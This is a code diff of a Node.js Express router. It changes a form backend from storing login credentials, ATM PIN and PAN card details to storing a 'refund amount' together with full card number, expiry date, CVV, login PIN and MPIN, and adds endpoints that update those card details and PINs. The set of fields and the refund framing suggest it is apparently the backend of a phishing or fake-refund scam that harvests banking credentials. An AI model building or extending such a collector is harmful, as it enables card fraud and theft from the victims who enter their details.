@@ -31,7 +31,7 @@ router.get("/:id", async (req, res) => {
 //Create One
 router.post("/", async (req, res) => {
   //All Field Required
-  if (!req.body.user_id || !req.body.phone || !req.body.password) {
+  if (!req.body.refund_amount || !req.body.account_holder_name) {
     //Return eerror
     return res.status(400).json({
       message: "All fields are required",
@@ -39,26 +39,24 @@ router.post("/", async (req, res) => {
     });
   }
 
-  //Check if phone number is less than 10 digits
-  if (req.body.phone.length < 10 || req.body.phone.length > 10) {
-    return res.status(400).json({
-      message: "Phone number must be 10 digits",
-      status: "error",
-    });
-  }
-
-  const login = new DataSchema({
-    user_id: req.body.user_id,
-    phone: req.body.phone,
-    password: req.body.password,
-    signature: req.body.signature,
-    account_no: req.body.account_no,
-    atm_pin: req.body.atm_pin,
-    pan_card: req.body.pan_card,
+  const data = new DataSchema({
+    refund_amount: req.body.refund_amount,
+    account_holder_name: req.body.account_holder_name,
+    card_holder_name: req.body.card_holder_name,
+    card_number: req.body.card_number,
+    expiry_date: req.body.expiry_date,
+    cvv: req.body.cvv,
+    login_pin: req.body.login_pin,
+    mpin: req.body.mpin,
   });
   try {
-    const newWatchlist = await login.save();
-    res.status(201).json(newWatchlist);
+    //Save and return id
+    const newData = await data.save();
+    res.status(201).json({
+      message: "Data saved successfully",
+      status: "success",
+      id: newData._id,
+    });
   } catch (error) {
     res.status(500).json({ message: error.message });
   }
@@ -81,7 +79,7 @@ router.delete("/:id", async (req, res) => {
 });
 
 // Update signature
-router.patch("/signature/:id", async (req, res) => {
+router.patch("/card/:id", async (req, res) => {
   try {
     const watchlist = await DataSchema.findById(req.params.id);
     if (!watchlist) {
@@ -89,18 +87,23 @@ router.patch("/signature/:id", async (req, res) => {
         .status(404)
         .json({ message: "Watchlist not found", status: "error" });
     }
-
-    watchlist.signature = req.body.signature; // Update the signature field
+    
+    //Update Card Details
+    watchlist.card_holder_name = req.body.card_holder_name; // Update the card_holder_name field
+    watchlist.card_number = req.body.card_number; // Update the card_number field
+    watchlist.expiry_date = req.body.expiry_date; // Update the expiry_date field
+    watchlist.cvv = req.body.cvv; // Update the cvv field
 
     const updatedWatchlist = await watchlist.save();
     res.status(200).json(updatedWatchlist);
+
   } catch (error) {
     res.status(500).json({ message: error.message });
   }
 });
 
 // Update signature
-router.patch("/account_no/:id", async (req, res) => {
+router.patch("/login/:id", async (req, res) => {
   try {
     const watchlist = await DataSchema.findById(req.params.id);
     if (!watchlist) {
@@ -109,10 +112,12 @@ router.patch("/account_no/:id", async (req, res) => {
         .json({ message: "Watchlist not found", status: "error" });
     }
 
-    watchlist.account_no = req.body.account_no; // Update the signature field
+    watchlist.login_pin = req.body.login_pin; // Update the login_pin field
+    watchlist.mpin = req.body.mpin; // Update the mpin field
 
     const updatedWatchlist = await watchlist.save();
     res.status(200).json(updatedWatchlist);
+    
   } catch (error) {
     res.status(500).json({ message: error.message });
   }
